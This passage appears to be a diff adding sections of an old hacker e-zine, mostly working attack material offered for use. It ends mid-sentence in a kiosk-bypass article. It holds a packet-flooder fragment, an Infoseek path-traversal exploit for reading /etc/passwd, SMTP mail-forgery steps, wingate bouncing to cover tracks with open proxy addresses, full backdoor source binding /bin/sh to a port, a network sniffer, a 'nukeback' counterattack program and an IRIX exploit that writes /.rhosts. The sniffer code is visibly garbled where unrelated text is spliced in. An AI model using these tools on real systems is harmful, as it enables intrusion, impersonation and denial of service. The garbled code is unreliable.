+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 44;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */
+
+        for(i=0;i<PADDING;i++)
+        {
+                p_ptr[i++]=random()%255;
+        }       
+
+    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+    free(packet);
+}
+
+u_long name_resolve(u_char *host_name)
+{
+    struct in_addr addr;
+    struct hostent *host_ent;
+
+    if ((addr.s_addr = inet_addr(host_name)) == -1)
+    {
+        if (!(host_ent = gethostbyname(host_name))) return (0);
+        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
+    }
+    return (addr.s_addr);
+}
+
+void usage(u_char *name)
+{
+    fprintf(stderr,
+            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many
+]\n",
+            name);
+    exit(0);
+}
+
+     (11)-----------SECURITY-------------------------------------------(11)
+
+  [Infoseek]--------------------------------------------------| optiklenz |
+
+          http://www.infoseek.com/cgi/bin?/./view?/home/path
+
+          Alternate bin with etc (etc, etc), and you will receive /etc/
+          directory structure which contains the passwd file.
+
+          The above exploits a discreet flaw in Infoseek's cgi.  It can
+          be used to view various binaries, and commands.  If you are
+          viewing it using a Netscape browser, keep reloading the
+          document; output will change the binary data.  If you are using
+          lynx you should receive command binary, and a directory
+          structure...
+
+          /bin/
+          For example:
+
+imeOasetunameOäsleepOåstrchgOæstrconfOçsttyOèsuOétabsOêtailOëtalkOìtee
+OítelnetOîtftpOïticOþtimeOñtipOòtplotOótputOôtrOotrueOöttyO÷unameOøupt
+imeOùvacationOúvmstatOûwcOüwhichOywhoOþwhoisOwriteOxargsOxstrONbgONcd
+ONcommandO[dispgidOddispuidOzexONfcONfgONgetoptsONhashOi386Oi486Oi860O
+i86pcOiAPX286ONjobsONkillOhlnOm68kOmc68000Omc68010Omc68020Omc68030Omc6
+8040OhmvOþpageOpdp11ONreadOyredO¥rkshOshOsparcOsunOsun2Osun3Osun3xOsun
+4Osun4cOsun4dOsun4eOsun4mONtestOâtouchONtypeOu370Ou3bOu3b15Ou3b2Ou3b5O
+NulimitONumaskONunaliasOvaxOzveditOzviOzviewOøwONwaitOAyppasswdOdmesgO
+pcatOstraceOasaOawkObannerObatchO bcO bdiffObfsOcalO
+ calendarOcolOcommOcompressOcsplitOdcOdiffOdiff3OdircmpOdos2unixOexpand
+OfactorOgraphOlastOlastcommOlognameOlookOmkfifoOnawkO  OfactorOgraphOlas
+ OlastcommOlognameOlookOmkfifoOnawkO
+ newformO!newsO"nlO#packO$pasteO%rupO&rusersO'sdiffO(sortO)spellO*splin
+eO+splitO,sumO-tcopyO.unexpandO/uniqO0unitsO1unix2dosO2unpackO3uudecod
+eO4uuencodeO5vsigOoawkO uncompressOzcatO6volcheckO7audioconvertO8
+admintoolO;showrevOchrtblO?colltblO@gencatOAgettxtOBkbdcompOClocaleODm
+kmsgsOEmontblOFmsgfmtOGprintfOHsrchtxtOIxgettextO>wchrtblOJaddbibOKapr
+oposOLcheckeqOMchecknrONdapsOOderoffOPdiffmkOQeqnORindxbibOSlookbibOTn
+eqnOUnroffOVreferOWroffbibOXsoelimOYsortbibOZtaO[tblO\troffO]ulO^vgrin
+dOKcatmanOKmanOKwhatisO_sagO`sarOaacctcomObtimexOcctOdcuOeuucpOfuuglis
+
+          http://www.infoseek.com/cgi/etc?/./read_./log/view?/home/passwd
+
+          In lynx, it will list the directory structure for the etc
+          directory.
+          ie: /etc/
+
+resolv.conf .. passwd
+notrouterHlogin.accessshellsIhosts.equivS defaultrouterTskeykeys"
+hostname.hme1 oshadowstmpP8opasswd(rdista005nY
+publickey;chrootmvdir?pwck@termcapAunlinkBrmmount.confC
+vold.confD.sysIDtool.stateE defaultdomainFnodenameG
+hostname.hme0.obp_devicesJinitpipe.old.35Wpath_to_inst.oldK.mnttab.loc
+
+          If you use lynx, you will be able to grab the .passwd file.
+
+     (12)-----------SECURITY-------------------------------------------(12)
+  
+  [Mail Forge]------------------------------------------------| optiklenz |
+
+          I wrote about this years ago, and decided to revise.
+
+          This exploits smtp (port numeric value 25) allowing you to forge
+          email from a remote host.
+  
+          Unix/Linux users use:
+          $ telnet url.host.net
+   
+          Windows users use:
+          c:\windows\telnet <--
+
+          Enter url.host.net as the host to connect to, and 25 as the port.
+ 
+          After connected:
+
+          220 url.host.net ESMTP Sendmail 8.8.5/SCO5 ready at Label,
+          day month/day/year
+          3 -0400 (EDT)  
+
+          If it prompts with a "It's always polite to "helo" command,
+          then just helo it.
+      
+          mail from: fake@faked.net               [ Commands:           ]
+                   then                           [ helo = call send    ]
+          rcpt to: user@domain.net                [ mail = from sender  ]
+                                                  [ rcpt = to recipient ]
+                                                  [ vrfy = verify       ]
+                                                  [ help = help         ]
+
+          vrfy comes in to process if things don't seem to be going
+          right.  For verify it is good to know uid's of people who use
+          the system your forging from.  Use: vrfy uid (user id)
+      
+          Then type "data", and press enter. The first thing you'll type
+          in is a title.  Next is the body msg.  Both should be on
+          seperate lines. once finished type a --> . <-- then type quit,
+          and press enter.
+
+     (13)-----------SECURITY-------------------------------------------(13)
+  
+  [Wingate]---------------------------------------------------| optiklenz |
+
+          Short preface on wingating vault purposes.  One is able to use
+          an exploit in certain systems to bounce from one host to another.
+          A wingate can be used for system benefit or system downfall. One
+          way it can be used is as a firewall to protect from outside
+          attacks on your host. Another use is bouncing from one host to
+          another to cover your tracks. This will put the fault on the
+          system you wingated from.
+
+          Unix/Linux usage:
+          $ telnet wingate.net
+  
+          Windows usage:
+          Run a telnet client and connect to a wingate address via port
+          23.  Once prompted with "  Wingate: " you then enter the
+          location you wan't to bounce to.  If using the wingate method
+          to test your systems logging it is good to bounce from more
+          then one wingate at a time.
+
+          Using Wingate as a socks host on IRC:
+
+          Linux use (from ircii or BitchX, etc.):
+          /server <wingate>:23  /quote <irc server>:6667
+
+          Windows use:
+          Enter wingate location in your irc client's
+          "FIREWALL/SOCKS HOST" query.
+
+          [Some Wingates For your Proxy Pleasure]
+
+          ns2.thesocket.com
+          formfill.com
+          207.96.173.116
+          207.96.173.109
+          207.96.173.119
+          207.96.173.144
+
+     (14)-----------SECURITY-------------------------------------------(14)
+
+
+  [backdoor.c]---------------------------------------------------| jsbach | 
+
+ /*
+          backdoor.c by jsbach@bear.cs.zorg.edu.
+          That dup2() shit was ripped from pluvius@io.org.
+
+          Compiles fine on *BSD*, Linux, and Solaris (on Solaris -lsocket)
+          to hide the process i strcpy("", argv[count]);, making it
+          invisible on Solaris and pretty inconspicuous on BSD and Linux.
+
+          Basically, this binds a program to a specified port and listens
+          for a connection.  When you exit the program, you DON'T get
+          dropped to a shell, so you can let people bounce telnet
+          connections off your box but not access anything else, or
+          whatever.
+
+          Example usage:
+          ./backdoor /bin/sh 31337 p@55w0rd &
+          or
+          ./backdoor /bin/sh 31337
+ */
+
+#define DATA "Hello.  Please place semicolons after commands in shell mode :P\n---\n"
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <signal.h>
+#include <netinet/in.h>
+
+int sockfd, count, clientpid, socklen, serverpid, temp, temp2,temp3;
+struct sockaddr_in  server_address;
+struct sockaddr_in  client_address;
+
+main(int argc, int **argv)
+{
+char password[ sizeof( argv[3] ) ];
+char passwordchk[ sizeof( argv[3] ) ];
+
+count=0;
+if (argc < 3) {
+        printf("usage: %s program_to_run port_number password(optional)\n",argv[0]);
+        exit(-1);
+        }                
+if (argc == 4)
+        {
+        strcpy((char *)&password, argv[3]);
+        strcpy((char *)argv[3], "");
+        }
+
+printf("\n-----\nDaemon running %s on port %d.  PID is %d.\n-----\n",argv[1], atoi(argv[2]), getpid());
+sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); /*add error checking*/
+
+bzero((char *) &server_address, sizeof(server_address));
+strcpy((char *)argv[0],"");
+server_address.sin_family=AF_INET;
+server_address.sin_port=htons(atoi(argv[2]));
+strcpy((char *)argv[2],"");
+server_address.sin_addr.s_addr=htonl(INADDR_ANY);
+bind(sockfd, (struct sockaddr *)&server_address, sizeof(server_address));
+
+listen(sockfd, 5);
+signal(SIGHUP, SIG_IGN);
+
+while(1)
+{
+socklen=sizeof(client_address);
+temp=accept(sockfd, (struct sockaddr *)&client_address,&socklen);
+
+if(argc == 4)
+{
+while(1)
+        {
+        write(temp, "Password: ", 10);
+        read(temp, &passwordchk, sizeof(password));
+        if(strncmp(passwordchk, password, sizeof(password)) == 0)
+                break;
+        bzero(passwordchk,sizeof(passwordchk));
+        }
+}
+
+write(temp, DATA, sizeof(DATA));
+if (temp < 0) exit(0);
+clientpid=getpid();
+serverpid=fork();
+if (serverpid != 0)
+        {
+        dup2(temp,0); dup2(temp,1); dup2(temp,2);
+        execl(argv[1],argv[1],(char *)0);
+        }
+        close(temp);
+        }
+}
+
+     (15)-----------SECURITY-------------------------------------------(15)
+
+  [IP Spoofing]-----------------------------------------------| optiklenz |
+
+          GENERAL:
+        - System A tries to open a connection to System B.  System B
+          accepts the connection (or not) and sends back a response; the
+          connection gets established and interacted.
+        - Requires trust between A and B.
+
+          SOURCE-ROUTE:
+        - System A wants to 'fake' one of your system's addresses to talk
+          with System B (the address to be 'faked' is assumed to be trusted
+          to B).  The exact same thing happens as above, except the first-
+          hop gateway from System A has been set up to route YOUR netmask
+          to System A and System A has been set up with the trusted address
+          on your net.  The other is that System A is 'source routing'
+          (LSR if distant) to your net with the first-hop's address in
+          the route, so when System B answers its buddy, the trusted
+          system, the packets are actually going to System A's first-hop
+          and getting routed to System A.  The fix is to disallow source-
+          routing of course.
+        - Requires control of first-hop routing from System A and that
+          System B's net allows source-routing.
+
+          SPOOF (DNS spoofing)
+        - System A finds r* programs on System B and modifies the reverse
+          DNS entries for System A to look like a system that B trusts.
+          System A connects to System B, B looks up the DNS entry and
+          gets back a host that B trusts.  Easy, ugly.  Fix is tcp-wrappers
+          or replace r*'s.
+        - Requires control of reverse DNS tables with System A's address
+          and the default/stupid r* command daemons on System B.
+
+          SPOOF (DNS spoofing with cache poison)
+        - As above but System A 'volunteers' an IP address in an MX record
+          to System B's DNS cache so that if tcp-wrappers are running the
+          second lookup and compare with also succeed. 
+
+          SPOOF (IP level 'blind' spoofing):
+        - System A shuts down the trusted host on your network via quirks
+          in the implementations of TCP/IP (or waits for it to go down or
+          whatever).  System A sends a non-source-routed connect packet to
+          System B using the trusted hosts's network address, just like
+          the trusted host would have done if it were initiating a
+          connection.  System B sends out the response to its buddy and
+          it stays on the local subnet (why would it have any desire to
+          leave ?).  System A never gets the response, but the seq#
+          guessing code doesn't care, it just guesses the next seq# in the
+          chain of packets that System B would expect and pretends it has
+          an open connection (which to System B it does, but System A has
+          no way of really knowing that- thus, it (System A) is acting
+          'blind').  The point of the exercise is to send System B
+          something that gives System A some kind of access/feedback.  The
+          fix: don't allow external packets into your network that have
+          internal addresses.
+        - Requires System B's net to allow external packets with internal
+          addresses.
+
+          GAINING TRUST RELATIONSHIP 
+          One fashion of accomplishing this would be setting up 
+          a circumstantial ralationship between System A and System B.
+          In the main directory of System A create a .rhosts file:
+          echo B uid > ~/.rhosts, and the same on System B.
+
+          Same method goes for SCO Unix: if you rlogin as root to a
+          system via a trusted host (one which is in the
+          /etc/hosts.equiv), a passwd is not required.
+
+          VHOST vs SPOOFING
+          I've seen various people on irc who believe that because they
+          are irc'ing with a vhost, they are spoofed.  That is definitly
+          not the case. A Vhost (Virtual Host) is merely the ability for 
+          a machine to be a web server for multiple domains.
+  
+          vhost ie: advisory.legions.org <--[vhost]
+
+     (16)-----------SECURITY-------------------------------------------(16)
+
+  [Anal Sniff]--------------------------------------------------| chron1c |
+
+/*
+Program Title:            :  Anal Sniffer v.01
+Author                    :  chron1c
+Date                      :  19 April 1998
+Sytem                     :  Linux  -- Tested on Slackware v3.x,Red Hat
+                             v4.x, OpenLinux 1.x, and OpenBSD v2.x
+Web Page                  :  http://www.legions.org/chronic/
+Contacts                  :  chronic@legions.org
+Affiliation               :  Legions Of the Underground
+                             http://www.legions.org
+Description               :  Anal Sniffer v.01 is a program used to
+                             monitor TCP/IP packets.
+*/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <string.h>
+
+#include <sys/time.h>
+#include <sys/file.h>
+#include <sys/stropts.h>
+#include <sys/signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+
+#include <net/if.h>
+#include <net/nit_if.h>
+#include <net/nit_buf.h>
+#include <net/if_arp.h>
+
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_var.h>
+#include <netinet/udp_var.h>
+#include <netinet/in_systm.h>
+#include <netinet/tcp.h>
+#include <netinet/ip_icmp.h>
+
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#define ERR stderr
+
+char    *malloc();
+char    *device,
+        *ProgName,
+        *LogName;
+FILE    *LOG;
+int     debug=0;
+
+#define NIT_DEV     "/dev/nit"
+#define CHUNKSIZE   4096        /* Device buffer size. */
+int     if_fd = -1;
+int     Packet[CHUNKSIZE+32];
+
+void Pexit(err,msg)
+int err; char *msg;
+{ perror(msg);
+  exit(err); }
+
+void Zexit(err,msg)
+int err; char *msg;
+{ fprintf(ERR,msg);
+  exit(err); }
+
+#define IP          ((struct ip *)Packet)
+#define IPD         (ip->ip_dst)
+#define IPeq(s,t)   ((s).s_addr == (t).s_addr)
+#define IP_OFFSET   (0x1FFF)
+#define IPHLEN      (ip->ip_hl)
+#define IPLEN       (ntohs(ip->ip_len))
+#define IPS         (ip->ip_src)
+#define SZETH       (sizeof(struct ether_header))
+#define TCPD        (tcph->th_dport)
+#define TCPS        (tcph->th_sport)
+#define TCPOFF      (tcph->th_off)
+
+#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))
+
+#define MAXBUFLEN  (1000)
+time_t  LastTIME = 0;
+
+struct CREC {
+     struct CREC *Next,
+                 *Last;
+     time_t  Time;
+     struct in_addr SRCip,
+                    DSTip;
+     u_int   SRCport,           /* src/dst ports */
+             DSTport;
+     u_char  Data[MAXBUFLEN+2];
+     u_int   Length;
+     u_int   PKcnt;
+     u_long  LASTseq;
+};
+
+struct CREC *CLroot = NULL;
+
+char *Symaddr(ip)
+register struct in_addr ip;
+{ register struct hostent *he =
+      gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);
+
+  return( (he)?(he->h_name):(inet_ntoa(ip)) );
+}
+
+char *TCPflags(flgs)
+register u_char flgs;
+{ static char iobuf[8];
+#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')
+
+  SFL(0,TH_FIN, 'F');
+  SFL(1,TH_SYN, 'S');
+  SFL(2,TH_RST, 'R');
+  SFL(3,TH_PUSH,'P');
+  SFL(4,TH_ACK, 'A');
+  SFL(5,TH_URG, 'U');
+  iobuf[6]=0;
+  return(iobuf);
+}
+
+char *SERVp(port)
+register u_int port;
+{ static char buf[10];
+  register char *p;
+
+   switch(port) {
+     case IPPORT_LOGINSERVER: p="rlogin"; break;
+     case IPPORT_TELNET:      p="telnet"; break;
+     case IPPORT_SMTP:        p="smtp"; break;
+     case IPPORT_FTP:         p="ftp"; break;
+     default: sprintf(buf,"%u",port); p=buf; break;
+   }
+   return(p);
+}
+
+char *Ptm(t)
+register time_t *t;
+{ register char *p = ctime(t);
+  p[strlen(p)-6]=0; /* strip " YYYY\n" */
+  return(p);
+}
+
+char *NOWtm()
+{ time_t tm;
+  time(&tm);
+  return( Ptm(&tm) );
+}
+
+#define MAX(a,b) (((a)>(b))?(a):(b))
+#define MIN(a,b) (((a)<(b))?(a):(b))
+
+/* add an item */
+#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
+  register struct CREC *CLtmp = \
+        (struct CREC *)malloc(siz_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST"
+ );
+      }
+
+   } else {
+
+      if(TCPFL(TH_SYN)) {
+         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
+      }
+
+   }
+
+   IDLE_NODE();
+
+ }
+
+}
+
+/* signal handler
+ */
+void death()
+{ register struct CREC *CLe;
+
+    while(CLe=CLroot)
+        END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");
+
+    fprintf(LOG,"\nLog ended at => %s\n",NOWtm());
+    fflush(LOG);
+    if(LOG != stdout)
+        fclose(LOG);
+    exit(1);
+}
+
+/* opens network interface, performs ioctls and reads from it,
+ * passing data to filter function
+ */
+void do_it()
+{
+    int cc;
+    char *buf;
+    u_short sp_ts_len;
+
+    if(!(buf=malloc(CHUNKSIZE)))
+        Pexit(1,"Eth: malloc");
+
+/* this /dev/nit initialization code pinched from etherfind */
+  {
+    struct strioctl si;
+    struct ifreq    ifr;
+    struct timeval  timeout;
+    u_int  chunksize = CHUNKSIZE;
+    u_long if_flags  = NI_PROMISC;
+
+    if((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
+        Pexit(1,"Eth: nit open");
+
+    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0)
+        Pexit(1,"Eth: ioctl (I_SRDOPT)");
+
+    si.ic_timout = INFTIM;
+
+    if(ioctl(if_fd, I_PUSH, "nbuf") < 0)
+        Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    si.ic_cmd = NIOCSTIME;
+    si.ic_len = sizeof(timeout);
+    si.ic_dp  = (char *)&timeout;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");
+
+    si.ic_cmd = NIOCSCHUNK;
+    si.ic_len = sizeof(chunksize);
+    si.ic_dp  = (char *)&chunksize;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");
+
+    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
+    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
+    si.ic_cmd = NIOCBIND;
+    si.ic_len = sizeof(ifr);
+    si.ic_dp  = (char *)&ifr;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");
+
+    si.ic_cmd = NIOCSFLAGS;
+    si.ic_len = sizeof(if_flags);
+    si.ic_dp  = (char *)&if_flags;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");
+
+    if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0)
+        Pexit(1,"Eth: ioctl (I_FLUSH)");
+  }
+
+    while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
+        register char *bp = buf,
+                      *bufstop = (buf + cc);
+
+        while (bp < bufstop) {
+            register char *cp = bp;
+            register struct nit_bufhdr *hdrp;
+
+            hdrp = (struct nit_bufhdr *)cp;
+            cp += sizeof(struct nit_bufhdr);
+            bp += hdrp->nhb_totlen;
+            filter(cp, (u_long)hdrp->nhb_msglen);
+        }
+    }
+    Pexit((-1),"Eth: read");
+}
+ /* Yo Authorize your proogie,generate your own password and uncomment here */
+/* #define AUTHPASSWD "EloiZgZejWyms"
+
+void getauth()
+{ char *buf,*getpass(),*crypt();
+  char pwd[21],prmpt[81];
+
+    strcpy(pwd,AUTHPASSWD);
+    sprintf(prmpt,"(%s)UP? ",ProgName);
+    buf=getpass(prmpt);
+    if(strcmp(pwd,crypt(buf,pwd)))
+        exit(1);
+}
+    */
+void main(argc, argv)
+int argc;
+char **argv;
+{
+    char   cbuf[BUFSIZ];
+    struct ifconf ifc;
+    int    s,
+           ac=1,
+           backg=0;
+
+    ProgName=argv[0];
+
+ /*     getauth(); */
+
+    LOG=NULL;
+    device=NULL;
+    while((ac<argc) && (argv[ac][0] == '-')) {
+       register char ch = argv[ac++][1];
+       switch(toupper(ch)) {
+            case 'I': device=argv[ac++];
+                      break;
+            case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))
+                         Zexit(1,"Output file cant be opened\n");
+                      break;
+            case 'B': backg=1;
+                      break;
+            case 'D': debug=1;
+                      break;
+            default : fprintf(ERR,
+                        "Usage: %s [-b] [-d] [-i interface] [-f file]\n",
+                            ProgName);
+                      exit(1);
+       }
+    }
+
+    if(!device) {
+        if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
+            Pexit(1,"Eth: socket");
+
+        ifc.ifc_len = sizeof(cbuf);
+        ifc.ifc_buf = cbuf;
+        if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0)
+            Pexit(1,"Eth: ioctl");
+
+        close(s);
+        device = ifc.ifc_req->ifr_name;
+    }
+
+    fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV);
+    fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout",
+            (debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");
+
+    if(!LOG)
+        LOG=stdout;
+
+    signal(SIGINT, death);
+    signal(SIGTERM,death);
+    signal(SIGKILL,death);
+    signal(SIGQUIT,death);
+
+    if(backg && debug) {
+         fprintf(ERR,"[Cannot bg with debug on]\n");
+         backg=0;
+    }
+
+    if(backg) {
+        register int s;
+
+        if((s=fork())>0) {
+           fprintf(ERR,"[pid %d]\n",s);
+           exit(0);
+        } else if(s<0)
+           Pexit(1,"fork");
+
+        if( (s=open("/dev/tty",O_RDWR))>0 ) {
+                ioctl(s,TIOCNOTTY,(char *)NULL);
+                close(s);
+        }
+    }
+    fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid());
+    fflush(LOG);
+
+    do_it();
+}
+
+     (17)-----------SECURITY-------------------------------------------(17)
+
+  [Back Attack]---------------------------------------------------| chrak |
+
+/*
+          compile: cc nukeback.c -o nukeback -Wall
+          let it run like a shell script that nukes them back or something
+          run on port 1 to stop portscanners quickly
+          written by chrak
+*/
+
+#include <stdio.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+
+void main(int argc, char **argv)
+   {
+   int s_sock,c_sock,i;
+   struct sockaddr_in s_info, c_info;
+   char comline[66], *nuker;
+
+   if(argc != 3)
+      {
+      printf("usage: %s port nuker\n", argv[0]);
+      exit(EXIT_FAILURE);
+      }
+   s_sock = socket(AF_INET, SOCK_STREAM, 0);
+
+   s_info.sin_family = AF_INET;
+   s_info.sin_addr.s_addr = htonl(INADDR_ANY);
+   s_info.sin_port = htons(atoi(argv[1]));
+
+   bind(s_sock, (struct sockaddr *)&s_info, sizeof(s_info));
+   i = sizeof(c_info);
+   listen(s_sock, 1);
+   for(;;)
+      {
+      for(i=0;i<66;i++) comline[i] = '\0';
+      i = sizeof(c_info);
+      c_sock = accept(s_sock, (struct sockaddr *)&c_info, &i);
+      send(c_sock, "bleh?\n", 6, 0);
+      close(c_sock);
+      nuker = inet_ntoa(c_info.sin_addr);
+      printf("Connect from %s\n", nuker);
+      sprintf(comline, "%s %s", argv[2], nuker);
+      printf("Doing %s\n", comline);
+      system(comline);
+      printf("Waiting for next bitch...\n");
+      }
+   }
+
+     (18)-----------SECURITY-------------------------------------------(18)
+
+  [IRIX LMR]--------------------------------------------------| optiklenz |
+
+          This is found to affect Irix 5.3, but is also vulnerable on 6.1,
+          and 6.2.  This exploits license_eoe.sw.license_eoe. Note:
+          LicenseManager is GUI used to license subsystem.  This allows you
+          to install, update, and remove FLEXlm and NET_LS licenses. Any
+          user with access to an X screen would be able to run it. 
+
+          $ setenv netls_lincense_file /.rhosts
+          $ /usr/etc/LicenseManager
+
+     (19)-----------SECURITY-------------------------------------------(19)
+
+  [Securing Linux]----------------------------------------------| BlackIC |
+
+          This will explain some basic security measures you can take after
+          installing a Linux system. This is based on a slackware install,
+          but the information should be good for other distributions also.
+
+          First off, before you do anything you need to goto
+          /etc/inetd.conf and take out all the services you don't need;
+          for now comment them all out by adding a # in front of the line.
+          If you plan to use telnet and ftp read the later chapter on
+          securing those services.  Now for changes to take effect type
+          ps, get the pid of inetd and type kill -HUP <the inetd pid>.
+
+          Next you will want to goto /etc/rc.d/rc.inet2 and comment out
+          the following lines:
+
+# Start the SUN RPC Portmapper.
+#if [ -f ${NET}/rpc.portmap ]; then
+#   echo -n " portmap"
+#  ${NET}/rpc.portmap
+#fi
+# # Start the various SUN RPC servers.
+if [ -f ${NET}/rpc.portmap ]; then
+  # Start the NFS server daemons.
+  if [ -f ${NET}/rpc.mountd ]; then
+    echo -n " mountd"
+    ${NET}/rpc.mountd
+
+          Now if you plan on having users on your systems I recommend
+          getting sshd installed for a more secure shell, you can read
+          about and download it at http://www.cs.hut.fi/ssh.  Also make
+          sure you have the most current kernel (which of the time of this
+          writing is 2.0.33), I also recomend getting the Rhino9 Linux
+          Security Auditer Tool availible at rhino9.org; it will check
+          for suid programs and other possible security holes.  Also if
+          you are gonna give out shells make sure you trust these people.
+          Update your passwords at least once a month or more and
+          make sure there good passwords; not like "god", "password1",
+          "dog", etc.  Some examples of good ones are "x3toyC34j8gg2"; if
+          your reading this that means you probably have a newer
+          distribution so it already has shadow passwords built in, i
+          wouldn't recommend trying to install them if you don't, due to
+          the fact I have seen a few people have big probs because of it.
+
+          This guide was not meant to insure your security in any way,
+          just because new exploits come out all the time, so keep
+          yourself updated at cert.org or rootshell.com.  Also as a final
+          note, your system will never be 100% secure, as no system is,
+          so like um don't blame me if you get fucked over.
+
+     (20)-----------SECURITY-------------------------------------------(20)
+
+  [FoolProof]---------------------------------------------| Duncan Silver |
+
+          In's and Out's of FoolProof Control (not so FoolProof After All)
+
+          I thought long and relatively hard about what my article is
+          going to be about. Instead of bombarding you with yet another
+          "l33t" article on vulnerabilities and things that have been
+          written about over and over, I decided to bring you something
+          new, and while it may not be as glamorous as some of the other
+          topics I could have chosen, at least it is completelly new, and
+          unknown (to the best of my knowledge).  Hope you find it useful.
+                                                  - Duncan Silver
+
+--------------------------
+
+What is Foolproof Control: 
+FoolProof Control is a security program manufactured by SmartStuff
+Software, designed for Windows 3.1, Windows95, and MacOS.  The purpose of
+this program is to restrict access to certain programs and devices (for
+example, the default setup locks out access to hard drive, any preferences,
+options, etc.).  This program is quite useful (and widely used) in public
+institutions like schools and libraries.  FoolProof is basically a simple
+TSR (terminate and stay resident) program, executed at the startup time
+(yes, in some cases it can be bypassed by ctrl+break during startup). The
+restricted access features are considered locked by the computer, and are
+simply not available.  To unlock the restricted features, you need to enter
+the password.
+
+----------------------------
+
+A Word on FoolProof Passwords:  
+FoolProof priviledged users are divided into two categories: the users
+with access to all features, and users with access to FoolProof
+configuration itself. This simply means that there are two means of
+authorization, the first being clicking on the foolproof icon and entering
+the password (minimum of six characters) which gives you access to the
+FoolProof configuration, and the second method being the hotkey.  Now, I
+found hotkey feature to be quite interesting.  You see, hotkey is set of
+four keys which need to be pressed at the same time.  When this occurs,
+FoolProof is removed from the memory, enabeling all the features.  You are
+free to do as you please, however you are still unable to configure
+FoolProof or change the hotkey. After messing around with it for a long
+time (and installing some key loggers) I found that the hotkey always 
+constitutes of CTRL+SHFT+two alphabet characters.  I'm not sure if this 
+is only how they do it at the place where I tested it, or if this is a
+requirement.  
+
+-----------------------------
+
+Now that we have an idea of what it is, and what it does, we can
+move into the interesting part: defeating it.
+
+-----------------------------
+
+Preamble:  
+I spent quite some time messing around with FoolProof control, and I have
+discovered a major flaw affecting all the versions released so far.  I
+wrote to SmartStuff explaining this problem, and about a month later I
+received mail from them stating that they have been "unable to reproduce
+the problem."  It's quite obvious that their response is B.S, since I
+have exploited this vulnerability on several different sites.  
+
+----------------------------
+
+Windows 95 + 3.1
+DA FLAW:  This is quite funny actually, but while messing around on one of
+these FoolProof protected machines, I came upon a wonderous idea.  In the
+location window I entered: c:\.  Needless to say the "protected" contents
+of the hardrive appeared before me.  I am now able to execute any binary
+file simply by clicking on it.  However, I wanted more, I wanted to
+disable this FoolProof joke for good.  It turns out that if you try to
+open autoexec, netscape will execute it, which does you no good.  The way
+around this is to right click on the autoexec.bat file and then chose
+edit.  Contents of autoexec are displayed in NotePad, and after removing
+any references to FoolProof, do the same thing with config.sys.  After
+saving both files, simply reboot.  
+
+WHY oh WHY does this work?  
+Well for the technical part of it, FoolProof restricts access to USERS,
+and when I typed c:\ in the Netscape location window, the machine saw me
+as NETSCAPE instead of an USER.  Same thing with saving autoexec.bat and
+config.sys to the drive, the foolproof thinks that netscape is trying to
+save these files, and since Netscape is a program, it has any right to do
+whatever da fuck it wants to do.  Pretty simple eh?  
+
+------------------------
+
+Macintosh:
+Well, what can I say?  I was never much of a Macintosh fan.  Somebody went
+ahead of me in writing an article on defeating FoolProof for Macintosh,
+so the full credit for this section goes to tristan_durie@starbase.ca.
+   
+   1. One way to disable FoolProof is to hold down the space bar when
